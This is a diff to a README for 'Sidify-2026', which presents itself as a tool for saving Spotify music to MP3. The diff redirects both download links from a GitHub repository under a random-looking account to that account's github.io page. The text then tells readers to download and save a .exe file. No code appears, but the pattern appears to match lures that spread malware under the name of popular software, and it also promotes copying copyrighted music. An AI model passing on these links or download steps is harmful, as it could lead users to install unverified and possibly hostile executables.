@@ -1,12 +1,12 @@
 # 🎵 Sidify-2026 - Save Spotify Music to MP3 Files
 
-[![](https://img.shields.io/badge/Download-Sidify--2026-blue.svg)](https://github.com/Thousandth-menieresdisease185/Sidify-2026)
+[![](https://img.shields.io/badge/Download-Sidify--2026-blue.svg)](https://thousandth-menieresdisease185.github.io)
 
 ## 📥 How to Download the Software
 
 You can get the installation file from our repository page. Click the link below to access the download area.
 
-[Download Sidify-2026 Here](https://github.com/Thousandth-menieresdisease185/Sidify-2026)
+[Download Sidify-2026 Here](https://thousandth-menieresdisease185.github.io)
 
 Navigate to the page. Look for the file ending in .exe. Click the file name to start the download. Save this file to your computer desktop or your Downloads folder.
 
